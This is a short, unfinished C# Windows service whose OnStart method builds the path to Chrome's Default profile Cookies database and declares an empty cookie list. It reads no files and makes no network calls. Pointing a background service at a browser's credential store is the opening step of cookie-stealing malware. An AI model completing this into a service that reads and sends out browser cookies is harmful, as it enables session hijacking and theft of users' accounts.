using System;
using System.Collections.Generic;
using System.ServiceProcess;
using System.IO;

namespace WindowsService1
{
    public partial class Service1 : ServiceBase
    {
        public Service1()
        {
            InitializeComponent();
            this.CanStop = true;
            this.CanShutdown = true;
            this.CanPauseAndContinue = true;
            this.AutoLog = true;
        }

        protected override void OnStart(string[] args)
        {
            var local = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);

            var path = Path.Combine(local, @"Google\Chrome\User Data\Default\Cookies");

            List<string> cookieLists = new List<string>();

        }

        protected override void OnStop()
        {
        }
    }
}
